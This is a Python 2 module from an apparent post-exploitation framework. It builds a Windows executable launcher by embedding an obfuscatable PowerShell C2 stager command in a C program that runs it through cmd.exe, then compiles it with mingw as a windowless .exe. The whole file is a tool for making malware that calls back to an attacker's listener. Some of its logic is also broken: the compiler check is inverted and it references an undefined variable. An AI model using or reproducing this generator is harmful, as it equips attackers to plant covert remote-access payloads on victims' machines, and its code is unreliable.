from lib.common import helpers
import subprocess
import os,time

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Windows C Executable Based Launcher',

            'Author': ['@bofheaded'],

            'Description': ('Generate a Windows C Executable Based Launcher With Mingw32'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'NameOfExe' : {
                'Description'   :   'File to output .exe launcher to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/launcher.exe'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        listenerName = self.options['Listener']['Value']
        # staging options
        language = self.options['Language']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        outfile=self.options['NameOfExe']['Value']
        bin_raw='/tmp/bin.c'
        encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
        payload = "cmd.exe /c "+str(launcher)
        if os.path.isfile('/usr/bin/i586-mingw32msvc-gcc/') == True:
            print "[-] Mingw32 Not Installed, Aborting"
            return ""
        else:    
            if launcher == "":
                print helpers.color("[!] Error in launcher command generation.")
                return ""
            else:
                payload_raw = """
#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>
int main()
{
      system(" """+payload+""" ");
      return 0;
}
                """
                with open(bin_raw,'w') as f:
                    f.write(str(payload_raw))
                    f.close()
                time.sleep(2)
                self.genpay=subprocess.call(['i586-mingw32msvc-gcc',bin_raw,'-o',outfile,'-lws2_32','-mwindows'])
                print "[+] Generated output to : ",output
                print "[+] Cleaning Temp Files :)"
                time.sleep(2)
                os.remove(bin_raw)
                print "[+] Done"